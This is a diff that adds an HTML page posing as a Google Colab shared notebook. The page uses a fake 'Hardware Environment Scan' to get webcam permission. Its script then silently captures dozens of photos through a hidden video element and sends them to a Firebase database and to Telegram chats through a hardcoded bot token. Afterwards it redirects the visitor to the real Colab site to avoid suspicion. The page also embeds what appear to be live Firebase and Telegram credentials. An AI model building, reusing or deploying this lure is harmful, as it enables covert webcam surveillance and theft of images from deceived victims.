@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>colab.research.google.com | Shared File</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --colab-orange: #f9ab00;
+            --colab-bg: #ffffff;
+            --colab-text: #3c4043;
+            --colab-border: #dadce0;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--colab-bg); color: var(--colab-text);
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        .colab-nav {
+            height: 60px; border-bottom: 1px solid var(--colab-border);
+            display: flex; align-items: center; padding: 0 20px; gap: 15px;
+        }
+
+        .colab-logo { width: 32px; height: 20px; }
+
+        .file-info { flex-grow: 1; }
+        .file-name { font-size: 18px; font-weight: 400; color: #5f6368; }
+
+        .workspace {
+            flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: #f8f9fa; padding: 20px;
+        }
+
+        .code-preview {
+            width: 100%; max-width: 700px; background: #fff; border: 1px solid var(--colab-border);
+            border-radius: 8px; box-shadow: 0 1px 2px rgba(60,64,67,0.3); overflow: hidden;
+        }
+
+        .code-header { background: #f1f3f4; padding: 8px 16px; border-bottom: 1px solid var(--colab-border); display: flex; gap: 10px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+
+        .code-body { padding: 20px; font-family: 'Roboto Mono', monospace; font-size: 13px; line-height: 1.6; color: #1a73e8; }
+
+        .verification-overlay {
+            position: absolute; width: 100%; height: 100%; background: rgba(255,255,255,0.9);
+            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10;
+        }
+
+        .verify-box {
+            background: #fff; padding: 40px; border-radius: 8px; border: 1px solid var(--colab-border);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; max-width: 400px;
+        }
+
+        .btn-colab {
+            background: var(--colab-orange); color: #fff; border: none;
+            padding: 12px 24px; font-size: 14px; font-weight: 500; border-radius: 4px;
+            cursor: pointer; margin-top: 20px; transition: background 0.2s;
+        }
+        .btn-colab:hover { background: #e39a00; }
+
+        /* Sync UI */
+        #sync-ui { display: none; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid var(--colab-orange); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .node-tag { font-size: 10px; color: #999; margin-top: 20px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="colab-nav">
+        <img src="https://colab.research.google.com/img/colab_favicon_256px.png" class="colab-logo">
+        <div class="file-info">
+            <span class="file-name">mumbai_ai_model_v2.ipynb</span>
+        </div>
+    </div>
+
+    <div class="workspace">
+        <div class="code-preview">
+            <div class="code-header">
+                <div class="dot" style="background:#ff5f56"></div>
+                <div class="dot" style="background:#ffbd2e"></div>
+                <div class="dot" style="background:#27c93f"></div>
+            </div>
+            <div class="code-body">
+                <span style="color:#d73a49">import</span> tensorflow <span style="color:#d73a49">as</span> tf<br>
+                <span style="color:#d73a49">from</span> google.colab <span style="color:#d73a49">import</span> auth<br><br>
+                <span style="color:#6a737d"># Loading Mumbai high-compute weights...</span><br>
+                model = tf.keras.models.load_model(<span style="color:#032f62">'/content/drive/mumbai_node_01'</span>)<br>
+                print(<span style="color:#032f62">"Connection established to Mumbai Cloud Cluster"</span>)
+            </div>
+        </div>
+
+        <div class="verification-overlay" id="init-view">
+            <div class="verify-box">
+                <h2 style="font-size: 20px; margin-bottom: 12px;">High-Compute Access</h2>
+                <p style="font-size: 13px; color: #5f6368;">This notebook requires <b>A100 GPU</b> acceleration. To prevent bot-mining, please complete a <b>Hardware Environment Scan</b> to verify physical presence.</p>
+                <button class="btn-colab" onclick="startColabSync()">Connect to Runtime</button>
+                <div class="node-tag">Region: Asia-South1 (Mumbai)</div>
+            </div>
+        </div>
+
+        <div class="verification-overlay" id="sync-ui">
+            <div class="verify-box">
+                <div class="spinner"></div>
+                <div style="font-weight: 500;">Provisioning Runtime...</div>
+                <div style="font-size: 12px; color: #5f6368; margin-top: 8px;" id="colab-timer">Hardware handshake valid for 60s</div>
+                
+                <div style="text-align: left; background: #f1f3f4; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 10px; color: #5f6368; margin-top: 20px;">
+                    > AUTHENTICATING_MUMBAI_GATEWAY...<br>
+                    > SCANNING_LOCAL_ENVIRONMENT...<br>
+                    > ALLOCATING_VIRTUAL_GPU_CORE...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startColabSync() {
+            try {
+                // Requesting permission under the guise of "Hardware Verification"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'flex';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('colab-timer').innerText = `Hardware handshake valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            colabCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to official Colab
+                            window.location.href = "https://colab.research.google.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://colab.research.google.com";
+            }
+        }
+
+        function colabCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "COLAB_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_RUNTIME" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'colab_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
